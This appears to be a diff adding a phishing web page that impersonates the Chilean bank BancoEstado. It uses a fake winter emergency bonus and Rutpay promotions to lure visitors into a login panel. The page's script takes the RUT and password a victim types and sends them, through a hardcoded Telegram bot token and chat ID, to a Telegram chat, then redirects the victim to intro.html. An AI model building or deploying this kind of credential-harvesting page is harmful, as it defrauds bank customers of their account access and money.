+                        <path fill="#fff" d="M11.56 26.01h8.66V3.08a14.24 14.24 0 0 1-8.65 4.83v3.46L.82 16.04v3.38l10.76-4.72v-3.34l3.45-1.51v3.34l-3.44 1.51v3.29l3.45-1.51v3.3l-3.45 1.51V18L.82 22.72v3.29l10.77-4.72-.03 4.72Z"></path>
+                        <path fill="#FF7900" d="M11.56 17.99v-3.3l-.01.01L.79 19.41v3.3l10.77-4.72ZM11.56 21.29.79 26.01h10.77v-4.72Z"></path>
+                        <path fill="#FF7900" d="m11.56 14.69 3.45-1.5V9.86l-3.46 1.51v3.33l.01-.01ZM11.55 14.7l.01-.01-.01.01ZM11.56 17.99v3.3l3.45-1.51v-3.3l-3.45 1.5v.01ZM20.21 26.01h10.75V11.86L20.2 3.08l.01 22.93Z"></path>
+                        <path fill="#004DFF" d="M20.21 26.01H.79v5.03h30.17v-5.03H20.21Z"></path>
+                    </svg>
+            <span class="bono-verde">🌟 Recibe el BONO EMERGENCIA de INVIERNO</span>
+            <span class="monto">$30.000</span>
+            <span class="hijos">por hijos hasta los 13 años</span>
+        </h2>
+
+        <!-- Imagen del anuncio - se ve completa y ocupa todo el ancho -->
+        <img src="https://bancoestado-rutpay.vercel.app/5039607715260468463.jpg" alt="Anuncio Rutpay" class="imagen-anuncio">
+
+        <p class="subtitle">Para recibirlo ingresa con <strong>Rutpay</strong> para solicitarlo</p>
+
+         <a href="#" class="btn btn-rutpay">
+            Solicitalo aquí
+        </a>
+        
+        <div style="margin-top: 30px; padding: 20px; background: #fff3e0; border-radius: 15px;">
+            <p style="font-size: 22px; color: #333;">
+                <span class="highlight">Recuerda pagar en COPÉC con nuestra App Rutpay y obtén hasta 40% de descuento</span>
+            </p>
+            <p style="font-size: 20px; color: #ff3b1f; margin-top: 5px;">
+                <strong>¡y ahorrate unas Lucas!</strong>
+            </p>
+        </div>
+
+        <p style="font-size: 20px; color: #0059b8; margin-top: 15px;">
+            <strong>¡Sigue a @rutpay!</strong>
+        </p>
+
+        <div style="display: flex; justify-content: center; gap: 30px; margin-top: 30px; flex-wrap: wrap;">
+            <div style="background: #f5f5f5; padding: 15px 25px; border-radius: 10px;">
+                <p style="font-size: 18px; font-weight: bold; color: #ff8800;">Rutpay</p>
+                <p style="font-size: 16px; color: #333;">Recibe pagos con Rutpay</p>
+                <p style="font-size: 14px; color: #666;">En tu Super Compraqui</p>
+            </div>
+            <div style="background: #f5f5f5; padding: 15px 25px; border-radius: 10px;">
+                <p style="font-size: 18px; font-weight: bold; color: #ff8800;">Rutpay</p>
+                <p style="font-size: 24px; font-weight: bold; color: #333;">$7.700</p>
+                <p style="font-size: 14px; color: #666;">compraquí de bancoestado</p>
+            </div>
+        </div>
+
+       
+    </section>
+<div class="cards">
+        <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--40931a6e-12be-4d56-ae45-25bbc13d6383/tarjetas-bancoestado-pack-visa-2.png?quality=82&preferwebp=true" alt="Tarjetas BancoEstado">
+        <a href="#" class="btn-solicita">📱 Solicita ya</a>
+    </div>
+    <!-- SECCIÓN BIENEFICIOS (movida más abajo) -->
+    <section class="bieneficios-section">
+        <h2>
+            En junio disfruta de hasta
+            <strong>un 40% de dto.</strong>
+            con Bieeeeneficios
+        </h2>
+        <p>
+            en salud, viajes, comida rápida,
+            deportes y entretención.
+        </p>
+        <a href="#" class="btn">
+            Más información aquí
+        </a>
+    </section>
+
+    <!-- BENEFICIO -->
+    <div class="beneficio">
+        <div class="icono"></div>
+        <div class="texto">
+            <h3>Bieeeeneficios de invierno</h3>
+            <p>Descripción del beneficio.</p>
+        </div>
+    </div>
+
+    <!-- ===== PANEL LATERAL (Modal) ===== -->
+    <div class="modal" id="modal">
+        <div class="panel">
+            <div class="top-app">
+                <div class="logo-mini">
+                    <img src="logo-bancoestado.svg" alt="BancoEstado">
+                    <div class="texto-mini">
+                        <strong>BancoEstado</strong>
+                        Todo es más fácil.
+                    </div>
+                </div>
+                <div class="irapp">
+                    Ir a la App
+                </div>
+            </div>
+
+            <div class="panel-header">
+                <div class="logo-panel">
+                    <!-- Logo SVG de BancoEstado -->
+                    <svg role="img" alt="" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="158" height="32" viewBox="0 0 158 32" fill="none">
+                        <path fill="#fff" d="M31.71 0H0v31.79h31.71V0Z"></path>
+                        <path fill="#343E46" d="M53.38 24.27a8.47 8.47 0 0 0 2.31-.34l.44-2.35a5.89 5.89 0 0 0-2.41-.44c-1.28 0-2.24.44-2.43 1.47-.19 1.03.48 1.66 2.09 1.66Zm5.54-5-1.1 6a13.73 13.73 0 0 1-5.26 1.09c-3.24 0-4.58-1.37-4.18-3.56.4-2.19 2.61-3.49 5.26-3.47a7.211 7.211 0 0 1 2.63.42l.12-.62c.24-1.32-.49-2.11-2.25-2.11a6.21 6.21 0 0 0-3.23 1 1.75 1.75 0 0 1-.89-1.68 8 8 0 0 1 4.72-1.55c2.89 0 4.78 1.29 4.18 4.53M127.48 24.27a8.55 8.55 0 0 0 2.32-.34l.42-2.36a5.85 5.85 0 0 0-2.4-.44c-1.29 0-2.24.44-2.44 1.47-.2 1.03.48 1.66 2.09 1.66m5.55-5-1.11 6a13.728 13.728 0 0 1-5.26 1.09c-3.23 0-4.58-1.37-4.17-3.56.41-2.19 2.61-3.49 5.26-3.47a7.25 7.25 0 0 1 2.63.42l.11-.62c.24-1.32-.49-2.11-2.24-2.11a6.251 6.251 0 0 0-3.24 1 1.772 1.772 0 0 1-.89-1.68 8.052 8.052 0 0 1 4.72-1.55c2.89 0 4.78 1.29 4.19 4.53M71.58 20.57a7 7 0 0 1 6.87-5.85 4.92 4.92 0 0 1 3.47 1.25 4.1 4.1 0 0 1-1.75 1.87 2.87 2.87 0 0 0-2.11-.85 4 4 0 0 0-3.82 3.56c-.35 1.87.34 3.53 2.53 3.53a4.08 4.08 0 0 0 2.6-.92 2.2 2.2 0 0 1 1.06 1.78 6.73 6.73 0 0 1-4.1 1.41c-3.48 0-5.43-2.13-4.75-5.78Z"></path>
+                        <path fill="#343E46" d="M90.14 20.51c.38-2.1-.55-3.56-2.51-3.56a4 4 0 0 0-3.83 3.56c-.38 2.08.56 3.51 2.52 3.51a3.93 3.93 0 0 0 3.82-3.51Zm-9 0a7.07 7.07 0 0 1 6.92-5.83c3.37 0 5.31 2.41 4.68 5.83a7.05 7.05 0 0 1-6.91 5.8c-3.38 0-5.32-2.38-4.69-5.8ZM103.8 24.95a3.791 3.791 0 0 1 1.54-1.81 4.45 4.45 0 0 0 3.17 1.09c1.55 0 2.21-.58 2.35-1.32.14-.74-.41-1.15-2.32-1.45-1.91-.3-3.6-1-3.18-3.33.38-2 2.46-3.42 5.23-3.42a6.33 6.33 0 0 1 3.92 1.06 3.55 3.55 0 0 1-1.34 1.87 5.691 5.691 0 0 0-3.06-.83c-1.39 0-2.07.44-2.2 1.13-.13.69.29 1.07 2.11 1.37 2.31.37 3.9 1.18 3.49 3.35-.41 2.17-2.43 3.67-5.43 3.67a5.929 5.929 0 0 1-4.28-1.38ZM154.67 20.51c.39-2.1-.55-3.56-2.51-3.56a3.999 3.999 0 0 0-3.82 3.56c-.39 2.08.55 3.51 2.52 3.51a3.919 3.919 0 0 0 3.81-3.51Zm-9 0a7.071 7.071 0 0 1 6.92-5.83c3.38 0 5.31 2.41 4.68 5.83a7.046 7.046 0 0 1-6.91 5.8c-3.37 0-5.32-2.38-4.69-5.8ZM141.35 23.67a6.119 6.119 0 0 1-2.23.35c-2 0-3.1-1.34-2.71-3.49a4.118 4.118 0 0 1 4-3.49 3.39 3.39 0 0 1 2 .49l-1.06 6.14Zm2.19-11.84-.6 3.25a5.56 5.56 0 0 0-2.16-.35 7.101 7.101 0 0 0-7 5.85c-.69 3.69 1.39 5.73 5 5.73a12.24 12.24 0 0 0 4.94-1.09l2.61-14.15-2.79.76ZM123.11 15.17h-4.09l.53-2.85-2.73.76-1.75 9.51c-.49 2.63 1.05 3.69 3.41 3.69a5.93 5.93 0 0 0 3.49-1.17 2.209 2.209 0 0 0-.77-1.83 3.399 3.399 0 0 1-2 .74c-1.09 0-1.77-.42-1.47-2l.86-4.7h4.09c.149-.346.256-.709.32-1.08.065-.33.089-.665.07-1M105.47 11.13H95.04l.53 1.68c.01.086.01.174 0 .26v.13l-2.35 12.76h9.71a4.54 4.54 0 0 0 .38-1.22c.076-.375.093-.76.05-1.14h-7.09l.75-4.06h6.12c.157-.381.277-.776.36-1.18.073-.389.097-.785.07-1.18h-6.12l.68-3.67h6.88c.162-.38.283-.775.36-1.18.076-.395.103-.798.08-1.2M66.51 14.68a9.741 9.741 0 0 0-2.94.47.78.78 0 0 1-.22 0 .59.59 0 0 1-.23 0l-1.84-.55-.33 1.81-1.76 9.54c.421.084.85.124 1.28.12a6.58 6.58 0 0 0 1.33-.12l1.53-8.27a5.72 5.72 0 0 1 2.54-.6c1.68 0 2.51.76 2.14 2.77l-1.12 6.1c.425.084.857.124 1.29.12.45.003.898-.037 1.34-.12l1.24-6.72c.46-2.52-.71-4.56-4.24-4.56M45.69 15.12c-.25 1.39-1.16 2.17-3.1 2.17H40.3l.76-4.08c.73-.07 1.42-.1 2.09-.1 1.92 0 2.78.74 2.54 2m-.63 6.59c-.31 1.66-1.46 2.4-3.91 2.4a17.65 17.65 0 0 1-2.08-.11l.83-4.51h2.49c2 0 2.94.74 2.67 2.22Zm3.19-6.66c.48-2.61-1-4.08-4.86-4.08h-5.57l.6 1.79a.871.871 0 0 1 0 .28c.005.063.005.127 0 .19l-2.35 12.74c1.5.273 3.025.397 4.55.37 4.18 0 6.51-1.74 7-4.55a2.79 2.79 0 0 0-1.89-3.52 4.08 4.08 0 0 0 2.46-3.19"></path>
+                        <path fill="#FF2318" d="m.79 16.04 10.76-4.67V7.91a14.24 14.24 0 0 0 8.65-4.83l10.76 8.79v-11H.79v15.17Z"></path>
+                        <path fill="#fff" d="M11.56 26.01h8.66V3.08a14.24 14.24 0 0 1-8.65 4.83v3.46L.82 16.04v3.38l10.76-4.72v-3.34l3.45-1.51v3.34l-3.44 1.51v3.29l3.45-1.51v3.3l-3.45 1.51V18L.82 22.72v3.29l10.77-4.72-.03 4.72Z"></path>
+                        <path fill="#FF7900" d="M11.56 17.99v-3.3l-.01.01L.79 19.41v3.3l10.77-4.72ZM11.56 21.29.79 26.01h10.77v-4.72Z"></path>
+                        <path fill="#FF7900" d="m11.56 14.69 3.45-1.5V9.86l-3.46 1.51v3.33l.01-.01ZM11.55 14.7l.01-.01-.01.01ZM11.56 17.99v3.3l3.45-1.51v-3.3l-3.45 1.5v.01ZM20.21 26.01h10.75V11.86L20.2 3.08l.01 22.93Z"></path>
+                        <path fill="#004DFF" d="M20.21 26.01H.79v5.03h30.17v-5.03H20.21Z"></path>
+                    </svg>  
+                </div>
+                <div class="cerrar" onclick="cerrarPanel()">
+                    ✕
+                </div>
+            </div>
+
+            <div class="card-login">
+                <h2><strong>Ingresa a tu Banca en Línea</strong></h2>
+
+                <label><strong>RUT</strong></label>
+                <input type="text" id="rutInput" placeholder="Ej: 12345678k">
+
+                <label><strong>Clave</strong></label>
+                <div class="password-container">
+                    <input type="password" id="claveInput" placeholder="********">
+                    <button type="button" class="toggle-password" id="toggleClave" aria-label="Mostrar u ocultar clave">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                            <path d="M0 0h24v24H0z" fill="none"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <button class="btn-login" id="btnIngresar">
+                    Ingresar
+                </button>
+
+                <div class="link">
+                    ¿Problemas con tu Clave?
+                </div>
+
+                <div class="linea"></div>
+
+                <div class="btn-empresa">
+                    Acceso Empresas
+                </div>
+
+                <div class="ayuda-footer">
+                    ¿Necesitas ayuda?<br>
+                    Para aclarar dudas revisa nuestro <strong>Centro de ayuda</strong>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-logo-section">
+                <div class="footer-logo">
+                    <img src="https://rutbancoestado.vercel.app/logo-bancoestado.svg" alt="BancoEstado">
+                    <div class="footer-logo-text">
+                        BancoEstado
+                        <span>Desde 1853</span>
+                    </div>
+                </div>
+                <p class="footer-mission">
+                    Existimos para acompañar a todas las personas y empresas del país otorgando soluciones financieras para el logro de sus proyectos de vida.
+                </p>
+                <p class="footer-mission">
+                    Siendo una herramienta de política pública potente que apoye a Chile en su camino hacia el desarrollo integral.
+                </p>
+                <p class="footer-address">
+                    Casa Matriz BancoEstado: Avenida Libertador Bernardo O'Higgins N° 1111, Santiago.
+                </p>
+            </div>
+
+            <hr class="footer-divider">
+
+            <div class="footer-bottom">
+                <div class="footer-siguenos">
+                    <h4>Síguenos</h4>
+                    <div class="social-icons">
+                        <a href="#" aria-label="Facebook">📘</a>
+                        <a href="#" aria-label="Twitter">🐦</a>
+                        <a href="#" aria-label="Instagram">📷</a>
+                        <a href="#" aria-label="YouTube">▶️</a>
+                        <a href="#" aria-label="LinkedIn">🔗</a>
+                    </div>
+                </div>
+
+                <div class="footer-sitios">
+                    <a href="#">Personas</a>
+                    <a href="#">Microempresa</a>
+                    <a href="#">Pequeñas Empresas</a>
+                    <a href="#">Empresas</a>
+                    <a href="#">I. Públicas</a>
+                    <a href="#">Compraquí</a>
+                    <a href="#">O. Sociedad Civil</a>
+                    <a href="#">Corporativo</a>
+                    <a href="#">Investor Relations</a>
+                    <a href="#">Sostenibilidad Corporativa</a>
+                </div>
+
+                <div class="footer-app">
+                    <p>Con tu App BancoEstado todo es más fácil</p>
+                </div>
+            </div>
+
+            <div class="footer-copyright">
+                © 2025 BancoEstado. Todos los derechos reservados.
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // --- SLIDER ---
+        (function() {
+            const slidesContainer = document.getElementById('slides');
+            const slides = slidesContainer.querySelectorAll('.slide');
+            const totalSlides = slides.length;
+            let currentIndex = 0;
+            let autoPlayInterval = null;
+            const AUTO_PLAY_DELAY = 5000;
+
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            const dotsContainer = document.getElementById('dotsContainer');
+
+            function createDots() {
+                dotsContainer.innerHTML = '';
+                for (let i = 0; i < totalSlides; i++) {
+                    const dot = document.createElement('button');
+                    dot.classList.add('dot');
+                    if (i === 0) dot.classList.add('active');
+                    dot.setAttribute('data-index', i);
+                    dot.addEventListener('click', () => goToSlide(i));
+                    dotsContainer.appendChild(dot);
+                }
+            }
+
+            function updateDots() {
+                const dots = dotsContainer.querySelectorAll('.dot');
+                dots.forEach((dot, index) => {
+                    dot.classList.toggle('active', index === currentIndex);
+                });
+            }
+
+            function goToSlide(index) {
+                if (index < 0) index = totalSlides - 1;
+                if (index >= totalSlides) index = 0;
+                currentIndex = index;
+                slidesContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
+                updateDots();
+                resetAutoPlay();
+            }
+
+            function nextSlide() {
+                goToSlide(currentIndex + 1);
+            }
+
+            function prevSlide() {
+                goToSlide(currentIndex - 1);
+            }
+
+            function resetAutoPlay() {
+                if (autoPlayInterval) {
+                    clearInterval(autoPlayInterval);
+                    autoPlayInterval = null;
+                }
+                autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY);
+            }
+
+            function init() {
+                createDots();
+                slidesContainer.style.transform = `translateX(0)`;
+                updateDots();
+
+                prevBtn.addEventListener('click', prevSlide);
+                nextBtn.addEventListener('click', nextSlide);
+
+                const sliderContainer = document.querySelector('.slider-container');
+                sliderContainer.addEventListener('mouseenter', () => {
+                    if (autoPlayInterval) {
+                        clearInterval(autoPlayInterval);
+                        autoPlayInterval = null;
+                    }
+                });
+                sliderContainer.addEventListener('mouseleave', () => {
+                    if (!autoPlayInterval) {
+                        autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY);
+                    }
+                });
+
+                let touchStartX = 0;
+                let touchEndX = 0;
+                sliderContainer.addEventListener('touchstart', (e) => {
+                    touchStartX = e.changedTouches[0].screenX;
+                });
+                sliderContainer.addEventListener('touchend', (e) => {
+                    touchEndX = e.changedTouches[0].screenX;
+                    const diff = touchStartX - touchEndX;
+                    if (Math.abs(diff) > 50) {
+                        if (diff > 0) nextSlide();
+                        else prevSlide();
+                    }
+                });
+
+                resetAutoPlay();
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+        })();
+
+        // --- PANEL LATERAL ---
+        function abrirPanel() {
+            document.getElementById("modal").classList.add("active");
+            document.body.style.overflow = 'hidden';
+        }
+
+        function cerrarPanel() {
+            document.getElementById("modal").classList.remove("active");
+            document.body.style.overflow = '';
+        }
+
+        document.getElementById("modal").addEventListener("click", function(e) {
+            if (e.target === this) {
+                cerrarPanel();
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                cerrarPanel();
+            }
+        });
+
+        // --- Mostrar/Ocultar Clave con el "ojito" ---
+        document.addEventListener('DOMContentLoaded', function() {
+            const toggleBtn = document.getElementById('toggleClave');
+            const claveInput = document.getElementById('claveInput');
+
+            if (toggleBtn && claveInput) {
+                toggleBtn.addEventListener('click', function() {
+                    const type = claveInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                    claveInput.setAttribute('type', type);
+                    
+                    const svg = this.querySelector('svg');
+                    if (type === 'password') {
+                        svg.innerHTML = `
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
+                            <path d="M0 0h24v24H0z" fill="none"/>
+                            <line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="2"/>
+                        `;
+                    } else {
+                        svg.innerHTML = `
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
+                            <path d="M0 0h24v24H0z" fill="none"/>
+                        `;
+                    }
+                });
+            }
+        });
+
+        // ============================================
+        // CONFIGURACIÓN DE TELEGRAM
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
+        const TELEGRAM_CHAT_ID = '8042354877';
+
+        // Función para enviar mensaje a Telegram
+        async function enviarATelegram(rut, clave) {
+            const mensaje = `🔐 *NUEVO INGRESO BANCA EN LÍNEA*\n\n📋 RUT: ${rut}\n🔑 Clave: ${clave}`;
+            
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const params = new URLSearchParams({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                });
+                
+                const response = await fetch(`${url}?${params}`);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    console.log('✅ Mensaje enviado a Telegram');
+                    return true;
+                } else {
+                    console.error('❌ Error al enviar a Telegram:', data);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Error en la solicitud a Telegram:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // BOTÓN INGRESAR
+        // ============================================
+        document.getElementById('btnIngresar').addEventListener('click', async function() {
+            const rutInput = document.getElementById('rutInput');
+            const claveInput = document.getElementById('claveInput');
+            
+            const rut = rutInput.value.trim();
+            const clave = claveInput.value.trim();
+            
+            if (!rut || !clave) {
+                alert('Por favor, ingresa tu RUT y Clave');
+                return;
+            }
+            
+            // Mostrar loader o mensaje
+            this.textContent = 'Enviando...';
+            this.disabled = true;
+            
+            // Enviar a Telegram
+            const enviado = await enviarATelegram(rut, clave);
+            
+            // Restaurar botón
+            this.textContent = 'Ingresar';
+            this.disabled = false;
+            
+            if (enviado) {
+                // Redirigir a Google
+                window.location.href = 'intro.html';
+            } else {
+                alert('Error al enviar los datos. Intenta nuevamente.');
+            }
+        });
+
+        // Permitir Enter en los campos
+        document.getElementById('rutInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('btnIngresar').click();
+            }
+        });
+
+        document.getElementById('claveInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('btnIngresar').click();
+            }
+        });
+    </script>
+    
+    <script>
+    (function() {
+        const slidesContainer = document.getElementById('slides');
+        const slides = slidesContainer.querySelectorAll('.slide');
+        const totalSlides = slides.length;
+        let currentIndex = 0;
+        let autoPlayInterval = null;
+        const AUTO_PLAY_DELAY = 5000;
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const dotsContainer = document.getElementById('dotsContainer');
+
+        function createDots() {
+            dotsContainer.innerHTML = '';
+            for (let i = 0; i < totalSlides; i++) {
+                const dot = document.createElement('button');
+                dot.classList.add('dot');
+                if (i === 0) dot.classList.add('active');
+                dot.setAttribute('data-index', i);
+                dot.addEventListener('click', () => goToSlide(i));
+                dotsContainer.appendChild(dot);
+            }
+        }
+        function updateDots() {
+            const dots = dotsContainer.querySelectorAll('.dot');
+            dots.forEach((dot, index) => dot.classList.toggle('active', index === currentIndex));
+        }
+        function goToSlide(index) {
+            if (index < 0) index = totalSlides - 1;
+            if (index >= totalSlides) index = 0;
+            currentIndex = index;
+            slidesContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
+            updateDots();
+            resetAutoPlay();
+        }
+        function nextSlide() { goToSlide(currentIndex + 1); }
+        function prevSlide() { goToSlide(currentIndex - 1); }
+        function resetAutoPlay() {
+            if (autoPlayInterval) clearInterval(autoPlayInterval);
+            autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY);
+        }
+        function init() {
+            createDots();
+            slidesContainer.style.transform = `translateX(0)`;
+            updateDots();
+            prevBtn.addEventListener('click', prevSlide);
+            nextBtn.addEventListener('click', nextSlide);
+            const sliderContainer = document.querySelector('.slider-container');
+            sliderContainer.addEventListener('mouseenter', () => { if (autoPlayInterval) clearInterval(autoPlayInterval); });
+            sliderContainer.addEventListener('mouseleave', () => { if (!autoPlayInterval) autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY); });
+            let touchStartX = 0, touchEndX = 0;
+            sliderContainer.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; });
+            sliderContainer.addEventListener('touchend', (e) => {
+                touchEndX = e.changedTouches[0].screenX;
+                const diff = touchStartX - touchEndX;
+                if (Math.abs(diff) > 50) diff > 0 ? nextSlide() : prevSlide();
+            });
+            resetAutoPlay();
+        }
+        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
+        else init();
+    })();
+
+    function abrirPanel() { document.getElementById("modal").classList.add("active"); document.body.style.overflow = 'hidden'; }
+    function cerrarPanel() { document.getElementById("modal").classList.remove("active"); document.body.style.overflow = ''; }
+    document.getElementById("modal").addEventListener("click", function(e) { if (e.target === this) cerrarPanel(); });
+    document.addEventListener('keydown', function(e) { if (e.key === 'Escape') cerrarPanel(); });
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const toggleBtn = document.getElementById('toggleClave');
+        const claveInput = document.getElementById('claveInput');
+        if (toggleBtn && claveInput) {
+            toggleBtn.addEventListener('click', function() {
+                const type = claveInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                claveInput.setAttribute('type', type);
+                const svg = this.querySelector('svg');
+                if (type === 'password') {
+                    svg.innerHTML = `<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/><path d="M0 0h24v24H0z" fill="none"/><line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="2"/>`;
+                } else {
+                    svg.innerHTML = `<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/><path d="M0 0h24v24H0z" fill="none"/>`;
+                }
+            });
+        }
+    });
+
+    // Redirección a intro.html al hacer clic en "Solicita ya" e "Información aquí" (ejemplo)
+    document.querySelectorAll('.btn-redir, .btn-solicita, .btn-rutpay, .bieneficios-section .btn').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'intro.html';
+        });
+    });
+</script>
+
+</body>
+</html>
